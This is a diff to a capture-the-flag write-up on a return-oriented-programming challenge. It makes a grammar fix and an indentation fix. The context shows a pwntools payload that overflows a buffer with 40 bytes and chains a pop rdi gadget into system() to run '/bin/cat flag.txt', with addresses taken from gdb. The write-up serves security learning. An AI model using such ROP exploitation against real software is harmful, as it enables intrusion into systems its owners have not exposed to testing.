@@ -33,7 +33,7 @@ anything we want in the rdi register which according to the x86_x64 calling conv
 argument of any function, so what we want to do with the info we are given is to call `system('/bin/cat flag.txt')`,
 
 we had to find the addresses for the pop rdi gadget, the system call and the string we need to use through gdb,
-thankfully there are intentionally placed functions and strings in the binary which gives us these for free:
+thankfully there are intentionally placed functions and strings in the binary which give us these for free:
 ```
 Dump of assembler code for function usefulFunction:
    0x0000000000400742 <+0>:     push   rbp
@@ -82,8 +82,8 @@ call_system = 0x40074b
 cat_flag = 0x601060
 
 payload = flat(
-	b'A' * 40, 
-  p64(pop_rdi),
+	b'A' * 40,
+	p64(pop_rdi),
 	p64(cat_flag),
 	p64(call_system)
 )
